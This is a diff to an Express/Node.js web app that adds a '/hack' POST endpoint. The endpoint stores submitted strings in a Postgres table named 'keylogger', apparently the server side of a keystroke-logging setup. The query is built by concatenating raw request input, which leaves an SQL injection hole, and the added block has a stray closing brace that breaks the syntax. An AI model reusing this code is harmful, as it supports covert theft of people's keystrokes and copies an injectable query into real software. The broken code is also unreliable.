@@ -36,6 +36,21 @@ app.get('/getData', function(request,response) {
   });
 });
 
+app.post('/hack', function(request, response) {
+  var str = request.body.str;
+  var query = "insert into keylogger values ('"+str+"')";
+  pg.connect(process.env.DATABASE_URL, function(err, client, done) {
+    client.query(query, function(err, result) {
+        done();
+        if (err) {
+          console.error(err);
+        }
+      });
+  });
+  }
+  response.end();
+});
+
 app.post('/addUser', function(request, response) {
   var name = request.query.name;
   var number = request.query.number;
